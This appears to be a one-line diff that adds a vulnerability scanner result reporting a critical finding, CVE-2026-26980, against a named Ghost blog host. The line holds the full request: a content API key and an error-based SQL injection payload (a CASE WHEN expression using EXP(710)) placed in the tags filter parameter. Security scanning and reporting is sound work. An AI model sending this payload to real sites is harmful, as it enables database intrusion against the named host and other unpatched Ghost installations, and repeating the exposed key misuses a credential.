@@ -1,0 +1,1 @@
+[CVE-2026-26980] [http] [critical] https://ghost.orai.io/ghost/api/content/tags/?key=216d212889158b5dd09adee256&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-nxh-nd]
